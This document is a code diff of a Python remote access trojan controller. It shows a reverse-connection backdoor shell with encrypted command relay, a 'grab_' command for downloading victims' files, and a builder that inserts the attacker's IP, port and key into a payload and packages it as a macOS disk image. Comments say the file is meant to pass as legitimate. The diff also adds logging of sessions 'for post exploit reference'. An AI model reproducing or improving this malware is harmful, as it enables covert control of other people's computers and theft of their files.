@@ -1,11 +1,12 @@
-import socket
+import datetime
 import os
-import sys
-from cryptography.fernet import Fernet
-import struct
 import pickle
+import socket
+import struct
+import sys
 
 
+from cryptography.fernet import Fernet
 
 #### text colours
 'text colour codes:'
@@ -66,77 +67,16 @@ def read_code():
 def banner():
     print("")
     print("")
-    print("                             ^B^                                      ^^^^")
-    print("                            BBB^.                                    *^^^^")
-    print("                          ^%BB^^B                                   ^^^^B^^")
-    print("                          ^BBB&^^                                  ^^^^^#^^")
-    print("                          BBBB^^^%                                ^^^^^^%B^^B")
-    print("                         ^BBBBB^^^^                              ^^^^^%^^^^^")
-    print("                         BBBBBB^^^^^                             ^^^^^^^^^^^^")
-    print("                         BBBBBB^^^^^B                            B^^^^^^^BBB^")
-    print("                         BBBBBB^^^^^^B   BB^^^^^^^^^^^^^^  ^^_BBBB^^^^^^^^B^^")
-    print("                         BBBBB^^^^^^^^B^^^B^^^^^^^^^^B^^^^^^^^#%^B%^^B^^^^^B")
-    print("                         BBBBBB^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^BBBB^^^^^^^^^")
-    print("                          B^BB^^^^^^^^^^^^^^^^^^^^^^^^^^^B^^^^^^^^B^^^^^^^^^")
-    print("                          BBBB^B^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^B")
-    print("                         BBBBB^^^^^^^^B^^^^^^^^^^^^^^^^^^^^^^^^^^^^B^^^^^^^^^")
-    print("                         BBBBB#,^B^^^^BB^^^^^^B^&^^^.B^^B^^^^^_^^^^^^^^^^^^B^")
-    print("                         ^BB^_^%^^^^^BB^!^,*^^^^^^^^^^^^^^^B^^>,^B!#^^^^^^^^^")
-    print("                           ^&B^B^^^B^.BBB,B^^^B^^^^^^^^^^^B^^*BB^BB^^^^^^^^^")
-    print("                          B>BBBBBBBB^B,B^B^&B^^^^^^^^^^^^^B^BBBB^BB^^B^^^^^B")
-    print("                          &B^^B^B^BB.B^^^^^BBB^^^^^^^^#^^^BBB^&B^B^^^B^^^^^^")
-    print("                           ^B^*^B^BBB^^^B^BBBB^^B^^^^^^^#>BBBBBBBB^^%^^^^^^^")
-    print("                           ^^BB^B^^^^^BB^^^^BBB^^^^^^^B^^BBBBB^^^BBB^^^^^^^^")
-    print("                          B^^&^BBBB^BB^^^^B^^BBBB^^^^^B^_BBBBBBB^^^BB^^^^^^BB")
-    print("                         ^^^^^^B^BB^^!^_^B^^BBBB^^^^^^BBB^^BBBBBB^^^.^^^^^^B^^")
-    print("                          B#^B^,^B^^BB^B^%^^^^BB^>^^^BBBB>^B!^^.^^^^^^^B^^^^^^^")
-    print("                        B^>^^BBB,BBBB^BBBB^^^^BBBB^^^B*^^^^^BB%^^B^!^^^^^^^^B^^B")
-    print("                       ^^BBBBB.BB^B_BBBBBB^^^^^BB!^^BB^^^^^^BBB^BBB^B^^^^^^^^B^B")
-    print("                      B^^B^^BB!B!B_^BBBBBB!BB^B%^BB^BBBB^^BBBBBBBB^^^^^^^^^^^B^^B")
-    print("                       B.B.^BBBB^^B^BBBB_BBBBB^,BB^B^BB>^^^^*BBBBBBB&B^^^^^^^^^B^^")
-    print("                      ^B^B^BBBB^^.BBBBBB^^^BB*BB&^.^BB!B^^^B^!BBBBBB^^^^^^^^^BBBBB")
-    print("                     BBBB^BBBB^^^BBBBB^,BB^^#BBB_^^,BB^^^^BBB&^BB!B^^^^^^^^^^^B&*")
-    print("                     B^BBB^B^BBB^^^BB^^^B^^^^B#BB^^BBB^^^^,B^^BB^^%BB^^^^B^^BBB^.^")
-    print("                      B>!BB^.^^^^^BBBB^^^B^^^BBBB,^BBB^^^^BB^^^B^.^^^^^^^^^^^^^^B")
-    print("                     ^^B&B^^^^^^&BB^%^B^^^^^>B,BBBBBB_^^BB^^^^^^BBB^^^^B^^^^B^BB^")
-    print("                    BBB^BBB.B#B^BB^BB^B^^^^^^^B!BBBBBB^^^B^^^^^^^B^B^_^^^^^^^^B^^^")
-    print("                     B^BBBB^BBBBBBBB^BBB^^^^^^B^BBBBB^^^^B^^^^^BB^BB^^B^^^^^^B^B^")
-    print("                       >BBBBB^^B.B^BBBBBBBB^BB^^^BBBBBB^^B^^B^BBBB^B^B>^^^^^^^!BB_^")
-    print("                       BB^^BB^^^B!BBB,^BBB^BB^BB^^BBBB_^^B^^^^^B^BBBB^^^^^B^^^BB^^^")
-    print("                       B^BBBB^^^BB^!*BBB^&B^BBB^B^^BB^^^BB^^B^#^^^^^^^^^^^^^^^^^B^")
-    print("                      B^^B^^BB^^^^BBB^B^BBBBBBB^B^BBBB^^BBBB_B^^^^^^^^^^^^^^^BB^B")
-    print("                       BBB^BBBBB^^^B^^BBBBB^BBB^B^.%^B^^BBBB^B^^^^^^^^^^^^^^^^^B^")
-    print("                       BBBB^BBBB^^^^BBBB^^^BBBB^BBBBB^^BBBB.B^!B^^^^^^^^^^^^^^^B")
-    print("                          BBBBBBB^^^^&^^^BBBBBBBB^^^^B^BBBBB^B%^B*^^^^^^^^^^^^B^")
-    print("                         ^BB_B^BB^BB^BBBBBBBBBB^^^^^^^BBBBBBBBB&^^^^^^^^^^^^^^^")
-    print("                          ^BBB^BBBBBB.BBBBBBBBBBB^^^^^BBBBBBBBBBB^^^B^^^^^^^^B")
-    print("                          ^BB^^BBBBBB^B^^BBBBBBBBB^^^BBBBBBBBBB^^^^B,^^^^^^^^")
-    print("                           ^BB^^B^BBBBBBB^^BBBBBBB^^BBBBBBBBB^^^^B^B^^^^^^^^B")
-    print("                            ^BBB!BB%BBBBBBBB^^^^^^BB^^BBBBB^^^BB^BB^^^^^^^^B")
-    print("                              ^B&BBB^B^BBBBBBB^^B^,BBBB^B^^^^BBB%^^^^^^_B^^")
-    print("                               BBBBB^^_BBBBBBBB^^^^^^^^B^%BBBB^B^^^^^^^^*^")
-    print("                                 BBBBBBBBBBBBBBBBBBBB#BBBBB#^^B^^^^^^,^^^")
-    print("                                   ^.B^^BBBB^BBBBBBBBBBBBBB^^^&*BBB^^^,^")
-    print("                                      B^BBBB^B^BBBBBBB%BBB^^.BB.B^^B")
-    print("                                       BB^BBB^B^BBBBB^^^^&BB^^&^")
-    print("                                           B,*B^^^B^>B..BB.^B")
-    header()
-
-
-def header():
-    print("")
-    print("")
-    print(CRED + "     ::::::::::: :::::::  ::::    ::: :::::::::: ::::::::  :::   :::          ::::::::      ::: ::::::::::: " + CEND)
-    print(CRED + "        :+:    :+:   :+: :+:+:   :+: :+:       :+:    :+: :+:   :+:         :+:    :+:   :+: :+:   :+:      " + CEND)
-    print(CRED + "       +:+    +:+   +:+ :+:+:+  +:+ +:+       +:+         +:+ +:+          +:+         +:+   +:+  +:+       " + CEND)
-    print(CRED + "      +#+    +#+   +:+ +#+ +:+ +#+ +#++:++#  +#++:++#++   +#++:           +#+        +#++:++#++: +#+        " + CEND)
-    print(CRED + "     +#+    +#+   +#+ +#+  +#+#+# +#+              +#+    +#+            +#+        +#+     +#+ +#+         " + CEND)
-    print(CRED + "#+# #+#    #+#   #+# #+#   #+#+# #+#       #+#    #+#    #+#            #+#    #+# #+#     #+# #+#          " + CEND)
-    print(CRED + " #####      #######  ###    #### ########## ########     ###             ########  ###     ### ###          " + CEND)
-    print("------------------------------------------------created by Ford Larman----------------------------------------------")
+    print("     ____._______                                 _________         __   ")
+    print("    |    |\\   _  \\   ____   ______ ____ ___.__.   \\_   ___ \\_____ _/  |_ ")
+    print("    |    |/  /_\\  \\ /    \\ /  ___// __ <   |  |   /    \\  \\/\\__  \\\\   __\\ ")
+    print("/\\__|    |\\  \\_/   \\   |  \\___ \\ \\  ___/\\___  |   \\     \\____/ __ \\|  |  ")
+    print("\\________| \\_____  /___|  /____  >\\___  > ____|____\\______  (____  /__|  ")
+    print("                 \\/     \\/     \\/     \\/\\/   /_____/      \\/     \\/      ")
+    print("----------------------------created by Ford Larman-----------------------")
     menu()
 
-'# Menu options'
+'# Menu'
 def menu():
     print("\n")
     print("---Menu---")
@@ -178,6 +118,8 @@ def find_Server():
     print(CBLU + "[+] @ " + str(address) + CEND)
     backdoor(clientsocket, ss)
 
+###NEEDS WORK TO BE SOMETHING LEGITIMATE###
+# Make executable file a MacOS specific file. Not python file.
 '# Create rat file'
 def create_rat():
     print(CBLU + "\n[+] Creating RAT Executable" + CEND)
@@ -194,42 +136,32 @@ def create_rat():
     with open(full_name, "r") as f:
        get_all = f.readlines()
     # write inputs to new file.
-    with open(name, "w") as f:
+    with open(full_name, "w") as f:
         for i, line in enumerate(get_all, 1):
-            if i == 15:
+            if i == 14:
                 f.writelines("    key = " + str(current_key) + "\n")
-            elif i == 55:
-                f.writelines("      ip =" + "'" + ip + "'" + "\n")
-            elif i == 56:
-                f.writelines("      port = " + port + "\n")
+            elif i == 58:
+                f.writelines("        ip =" + "'" + ip + "'" + "\n")
+            elif i == 59:
+                f.writelines("        port = " + port + "\n")
             else:
                 f.writelines(line)
     print(CBLU + "[+] Writing Executable..." + CEND)
     # disguise socket as executable
-    make_exec_file(name)
-    print(CBLU + "[+] Executable created" + CEND)
+    make_dmg_file(name)
+    print(CBLU + "[+] Executable " + name + " created" + CEND)
     menu()
 
 'convert python file to executable'
-def make_exec_file(name):
-    'take generated python file and call python3 setup py2app'
-    'write name to setup.py file'
-    with open("setup.py", "r") as f:
-       get_all = f.readlines()
-    # write inputs to new file.
-    with open("setup.py", "w") as f:
-        for i, line in enumerate(get_all, 1):
-            if i == 10:
-                f.writelines("APP = ['" + name + "']\n")
-            else:
-                f.writelines(line)
-    os.system("python3 setup.py py2app -A")
-    os.system("rm " + name + ".py")
+def make_dmg_file(name):
+    'take generated python file and call dmgbuild'
+    os.system("sh build_script.sh")
+    #os.system("rm "+ name + ".py")
     return
 
 'screen shot function'
 # handle image as packets
-def receive_image(conn):
+def download_file(conn):
     data_size = struct.unpack('>I', conn.recv(4))[0]
     received_payload = b""
     remaining_payload_size = int(data_size)
@@ -241,59 +173,62 @@ def receive_image(conn):
 
 '#### - BACKDOOR FUNCTIONS - ####'
 # Communicate via backdoor
+#### Needs a file write function to maintain log activity for post exploit reference
 def backdoor(client, ss):
     print("\n")
+    date = datetime.datetime.now()
+    logName = str(date) + ".txt"
+    with open(logName, "w") as f:
+        f.writelines("JC--LOG FILE: " + str(date) + "\n")
+        f.close()
     while True:
         shell = input(CRED + "Shell>>>" + CEND)
         if shell == "exit":
             print(CBLU + "[+] Closing connection!\n" + CEND)
             client.close()
             ss.close()
+            with open(logName, "a") as f:
+                f.writelines("***Transmission Ended***")
+                f.close()
             menu()
         elif shell == "help":
-            print("\n#####################################")
+            print("\n#################################################")
             print("You've entered the targets computer..")
             print("You have a few options: ")
             print("'exit'  - to close connection")
-            print("'screen_grab' - to screenshot target")
-            #print("'_keylogr' - to initiate keylogger")
-            print("'grab_<filename> - to download a file")
+            print("'grab_<filename>' - allows you to download a specific file")
             print("\nOtherwise all directory commands remain the same.")
             print("Goodluck!")
             print("- JC\n")
-            print("#####################################\n")
-        elif shell == "screen_grab":
-            message = encrypt_mess(shell)
-            # print(message)
-            client.sendall(message)
-            data = receive_image(client)
-            img = "screen_grab.png"
-            data.save(img)
+            print("###################################################\n")
         elif "grab_" in shell:
               message = encrypt_mess(shell)
               client.sendall(message)
               file_name = shell.replace("grab_", "")
-              data = receive_image(client)
+              data = download_file(client)
               # save bytes to file format
               f = open(file_name, "wb")
               f.write(data)
               f.close()
-
+              print("\n You grabbed " + file_name + "!\n")
         else:
             message = encrypt_mess(shell)
             #print(message)
+            #needs error checking here
             client.sendall(message)
             #receive data
             data = client.recv(4096)
+
             #decrypt data
             rcv_message = decrypt_mess(data)
             #print message decoded
             print(CYEL + rcv_message.decode() + CEND)
-
-'currently working on!'
-# initiate keylogger
-def key_logger():
-    return
+            #Log file
+            with open(logName, "a") as f:
+                f.writelines("Shell>>>" + shell + "\n")
+                f.writelines(rcv_message.decode())
+                f.writelines("\n")
+                f.close()
 
 
 banner()
